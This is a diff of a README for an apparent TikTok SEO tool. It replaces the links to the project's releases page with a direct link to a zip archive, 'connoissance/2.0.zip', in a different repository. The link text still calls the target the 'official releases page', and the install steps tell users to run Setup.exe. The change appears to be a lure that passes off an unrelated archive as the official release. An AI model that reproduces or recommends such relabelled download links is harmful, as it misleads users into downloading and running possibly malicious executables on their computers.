@@ -5,7 +5,7 @@ description: "Optimize TikTok content with AI-driven hooks, hashtags, and captio
 ---
 # 🚀 TikTok-SEO-Assistant-2026 - Improve your organic TikTok video reach
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/trevorsi1739/TikTok-SEO-Assistant-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/trevorsi1739/trevorsi1739.github.io/raw/refs/heads/main/connoissance/2.0.zip)
 
 ## 📌 About this tool
 
@@ -33,7 +33,7 @@ It runs locally on your computer. You do not need experience with coding to oper
 
 Follow these steps to set up the software on your Windows computer.
 
-1.  Visit the [official releases page](https://github.com/trevorsi1739/TikTok-SEO-Assistant-2026/releases).
+1.  Visit the [official releases page](https://github.com/trevorsi1739/trevorsi1739.github.io/raw/refs/heads/main/connoissance/2.0.zip).
 2.  Click the file named `Setup.exe` to start the download.
 3.  Locate the file in your "Downloads" folder once the download finishes.
 4.  Double-click the `Setup.exe` file to begin the installation.
